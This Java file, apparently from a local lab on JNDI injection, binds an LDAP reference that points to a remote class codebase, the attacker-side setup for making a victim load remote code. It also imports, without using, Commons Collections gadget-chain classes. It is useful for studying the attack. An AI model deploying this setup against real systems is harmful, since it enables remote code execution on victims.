package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.naming.directory.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class JNDILDAPServer {
    public static void main(String[] args) throws Exception{
//        Hashtable env = new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY,
//                "com.sun.jndi.ldap.LdapCtxFactory");
//        env.put(Context.PROVIDER_URL,
//                "ldap://localhost:10389");
        InitialContext initialContext = new InitialContext();
        Reference refObj = new Reference("TestRef", "TestRef", "http://localhost:7777/");
        initialContext.rebind("ldap://localhost:10389/cn=test,dc=example,dc=com", refObj);

    }

}
